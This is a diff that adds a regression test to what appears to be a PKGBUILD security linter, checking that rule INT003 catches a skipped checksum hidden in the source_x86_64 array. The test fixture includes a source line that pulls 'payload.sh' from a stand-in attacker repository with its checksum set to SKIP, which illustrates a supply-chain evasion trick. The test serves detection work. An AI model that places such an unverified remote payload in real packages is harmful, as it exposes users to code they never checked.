@@ -185,6 +185,25 @@ def test_int003_fires_on_skip_for_sha1sums(make_pkgbuild_ctx):
     assert len(list(INT003SkippedChecksumOnNetworkSource().check(ctx))) == 1
 
 
+def test_int003_fires_on_skip_hidden_in_architecture_specific_source(make_pkgbuild_ctx):
+    # Regression: a malicious entry hidden only in source_x86_64=() (a standard
+    # makepkg architecture-override array) was invisible to INT003 -- ctx.sources
+    # only ever read the base source=() array.
+    ctx = make_pkgbuild_ctx(
+        """
+        pkgname=foo
+        arch=('x86_64')
+        source=("https://example.com/foo.tar.gz")
+        sha256sums=('deadbeef')
+        source_x86_64=("payload::https://raw.githubusercontent.com/attacker/x/main/payload.sh")
+        sha256sums_x86_64=('SKIP')
+        """
+    )
+    findings = list(INT003SkippedChecksumOnNetworkSource().check(ctx))
+    assert len(findings) == 1
+    assert "payload.sh" in findings[0].message
+
+
 def test_int005_fires_on_npm_install_in_post_install(make_install_ctx):
     ctx = make_install_ctx(
         """
